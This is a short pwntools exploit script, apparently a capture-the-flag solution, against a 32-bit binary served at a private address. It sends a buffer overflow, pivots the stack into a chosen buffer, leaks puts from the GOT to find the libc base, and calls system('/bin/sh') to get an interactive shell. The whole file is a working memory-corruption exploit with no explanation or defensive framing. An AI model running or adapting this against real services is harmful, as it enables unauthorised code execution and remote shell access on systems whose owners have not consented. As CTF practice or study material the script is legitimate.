from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn'
p = remote('172.16.12.2',6666)
#p = process(name)
elf = ELF(name)
libc=ELF('./libc_86-2.23.so')
#libc=ELF('/usr/lib/i386-linux-gnu/libc-2.24.so')
if args.G:
    gdb.attach(p)


read_plt = 0x8048380
puts_plt = 0x8048390
leave_ret = 0x08048418
pop_edx_ret = 0x0804836d
puts_got = 0x8049ff0
buf = 0x0804b000-0x200
buf2 = buf + 0x100
payload = b"a"*40
payload += flat([buf,read_plt,leave_ret,0,buf,100])
p.recvuntil(":")
p.send(payload)
sleep(0.1)

rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,0,buf2,100])

p.sendline(rop)
p.recvuntil("\n")
libc_addr = u32(p.recv(4)) - libc.symbols["puts"]
success("libc_addr: " + hex(libc_addr))
sleep(0.1)
system = libc_addr + libc.symbols["system"]
rop2 = flat([buf,system,0,buf2+4*4,b"/bin/sh"])
p.sendline(rop2)
p.interactive()